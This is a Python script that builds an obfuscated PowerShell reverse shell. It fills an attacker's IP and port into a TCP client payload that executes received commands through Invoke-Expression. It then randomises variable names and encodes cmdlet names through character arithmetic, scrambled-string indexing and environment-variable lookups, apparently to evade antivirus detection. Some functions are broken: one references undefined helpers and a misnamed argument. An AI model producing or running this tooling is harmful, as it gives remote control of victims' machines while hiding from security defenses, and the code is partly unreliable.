import re
import random
import string
import os

# PAYLOAD AND PATTERN
reverse_shell = """$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)();}$ReverseShellConnection.(/Close/)()"""

pattern = r"/.+?/"

# REPLACE IP/PORT
ip_address = input("Enter IP: ")
port = input("Enter port: ")
reverse_shell = reverse_shell.replace("IP_ADDRESS", ip_address)
reverse_shell = reverse_shell.replace("PORT", port)

# REPLACE VARIABLES
variables_2_replace = ["ReverseShellConnection",
                       "NetworkStream",
                       "ReadBuffer",
                       "BytesRead",
                       "CommandOutput",
                       "ExecutedOutput",
                       "PromptWithOutput",
                       "OutputBytes"]

for variable in variables_2_replace:
    random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
    reverse_shell = reverse_shell.replace(variable, random_string)

# METHOD 1
def list_2_character_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
    return r"([string]::join('', ( (" + str(ord(command)) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"

# METHOD 2
def character_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    parts = []
	
    for character in command:
        rnd = random.randint(1, 99)
        operation = "+" if random.choice([True, False]) else "*"
        compliment = "-" if operation == "+" else "/"
        if operation == "+":
            part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_}| % {$_} |%{$_})"
        else:
            part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_})"
        parts.append(part)
    return '+'.join(parts)

# METHOD 3
def random_string_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    char_positions = [''] * 150
    indices_used = []
    
    for character in command:
        index = random.choice([i for i in range(150) if char_positions[i] == ''])
        char_positions[index] = character
        indices_used.append(index)
        
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
            
    return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_}"

# METHOD 4
env = [
	"ALLUSERSPROFILE",
	"CommonProgramFiles",
	"ComSpec",
	"ProgramData",
	"ProgramFiles",
	"ProgramW6432",
	"PSModulePath",
	"PUBLIC",
	"SystemDrive",
	"SystemRoot",
	"windir"
]

envMap = {}

for c in string.printable:
    envMap[c] = {}
    for v in env:
        val = os.getenv(v)
        if c in val:
            envMap[c][v] = []
            for i,t in enumerate(val):
                if c == t:
                    envMap[c][v].append(i)
                    
def env_hide(object):
    if isinstance(match, str):
        command = match
    else:
        command = match.group(0)[1:-1]
	    
    hidden_strings = []
    for c in command:
        if c in envMap and envMap[c]:
            pVars = list(envMap[c].keys())
            cVar = random.choice(pVars)
            pIndex = envMap[c][cVar]
            cIndex = random.choice(pIndex)
            hidden_strings.append(f"$env:{cVar}[{cIndex}]")
        else:
            rand = random.randint(1, 3)
            if rand == 1:
                hidden_strings.append(part_to_char(c))
            elif rand == 2:
                hidden_strings.append(part_math(c))
            else:
                hidden_strings.append(rand_part_index(c))
    return "+".join(hidden_strings)

# REPLACE EACH MATCH WITH RANDOM METHOD
for match in range(int(reverse_shell.count("/")/2)):
    reverse_shell = re.sub(pattern,
                           lambda m: random.choice([list_2_character_2_string,
                                                    character_2_string,
                                                    random_string_2_string])(m),
                           reverse_shell,
                           count=1)

# WRITE TO FILE
print(reverse_shell)
